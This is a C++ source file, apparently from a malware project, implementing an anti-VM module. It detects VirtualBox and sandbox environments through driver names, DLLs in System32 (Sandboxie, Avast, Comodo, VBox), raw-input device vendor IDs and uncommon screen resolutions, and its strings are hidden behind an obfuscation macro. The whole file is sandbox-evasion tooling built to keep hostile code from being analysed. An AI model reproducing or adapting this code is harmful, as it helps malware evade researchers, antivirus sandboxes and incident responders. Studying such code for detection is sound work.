#include <string>
#include <vector>
#include <windows.h>
#include <psapi.h>
#include <filesystem>

#include "antivm.h"

#include "config.h"

std::vector<std::string> IllegalDrivers = {
	OBF("VBoxSF"),
	OBF("VBoxGuest"),
	OBF("VBoxMouse"),
	OBF("VBoxWddm")
};

std::vector<int> ScreenHeights = {
	4320,
	2160,
	1440,
	1080,
	900,
	864,
	768,
	720,
	576,
	480
};

std::vector<int> ScreenWidths = {
	7680,
	3840,
	2560,
	2048,
	1920,
	1536,
	1366,
	1280,
	1024
};

std::vector<std::string> IllegalVendors = {
	OBF("VID_80EE"), //VirtualBox
	OBF("PNP0F03")  //Unitek UPS Systems Alpha 1200Sx
};

std::vector<std::string> IllegalDlls = {
	OBF("SbieDll"),
	OBF("SxIn"),
	OBF("Sd2"),
	OBF("snxhk"),
	OBF("cmdvrt32"),
	OBF("VBoxDispD3D"),
	OBF("VBoxGL"),
	OBF("VBoxHook"),
	OBF("VBoxICD"),
	OBF("VBoxMRXNP"),
	OBF("VBoxNine"),
	OBF("VBoxSVGA"),
	OBF("VBoxTray")
};

AntiVM::AntiVM()
{
	this->detected = false;

	if (!config::antivm)
		return;

	if (this->CheckDrivers())
		return;

	if (this->CheckScreen())
		return;

	if (this->CheckDeviceVendors())
		return;

	if (this->CheckDlls())
		return;
}

bool AntiVM::GetDetected() noexcept
{
	return this->detected;
}

bool AntiVM::CheckDrivers() noexcept
{
	LPVOID drivers[1024];
	DWORD cb;

	if (K32EnumDeviceDrivers(drivers, sizeof(drivers), &cb) && cb < sizeof(drivers))
	{
		int count = cb / sizeof(drivers[0]);
		char buffer[512];


		for (auto& i : drivers)
		{
			if (K32GetDeviceDriverBaseNameA(i, buffer, sizeof(buffer)))
				for (auto x : IllegalDrivers)
					if ((char*)buffer == x + OBF(".sys"))
					{
						this->detected = true;
						return true;
					}
		}
	}

	return false;
}

bool AntiVM::CheckScreen() noexcept
{
	// We don't check if the user has multiple monitors since these are all accounted for in height/width
	if (GetSystemMetrics(SM_CMONITORS) != 1)
		return false;

	bool found = true;

	int h = GetSystemMetrics(SM_CYVIRTUALSCREEN),
		w = GetSystemMetrics(SM_CXVIRTUALSCREEN);

	for (auto i : ScreenHeights)
		if (i == h)
		{
			for (auto j : ScreenWidths)
				if (j == w)
				{
					found = false;
					break;
				}
			
			break;
		}

	this->detected = found;
	return found;
}

bool AntiVM::CheckDeviceVendors() noexcept
{
	UINT devices = 0;
	PRAWINPUTDEVICELIST deviceList = NULL;

	while (true)
	{
		if (GetRawInputDeviceList(NULL, &devices, sizeof(RAWINPUTDEVICELIST)) != 0)
			break;

		if (devices == 0)
			break;

		deviceList = (RAWINPUTDEVICELIST*)malloc(sizeof(RAWINPUTDEVICELIST) * devices);

		if (deviceList == NULL)
			break;

		devices = GetRawInputDeviceList(deviceList, &devices, sizeof(RAWINPUTDEVICELIST));
		if (devices == (UINT)-1)
		{
			free(deviceList);
			continue;
		}
		break;
	}

	if (deviceList == NULL)
		return false;

	for (int i = 0; i < (int)devices; i++)
	{
		UINT numChars = 0u;
		GetRawInputDeviceInfoA(deviceList[i].hDevice, RIDI_DEVICENAME, nullptr, &numChars);

		std::string test(numChars, 0);
		GetRawInputDeviceInfoA(deviceList[i].hDevice, RIDI_DEVICENAME, test.data(), &numChars);

		for (auto x : IllegalVendors)
		{
			if (test.find(x) != std::string::npos)
			{
				free(deviceList);

				this->detected = true;
				return true;
			}
		}
	}

	free(deviceList);
	return false;
}

bool AntiVM::CheckDlls() noexcept
{
	std::string path = OBF("C:\\Windows\\System32\\");

	for (auto& x : std::filesystem::directory_iterator(path))
	{
		if (!x.exists() || x.is_directory())
			continue;

		for (auto& y : IllegalDlls)
		{
			if (y + ".dll" == x.path().string().substr(path.length()))
			{
				this->detected = true;
				return true;
			}
		}
	}

	return false;
}
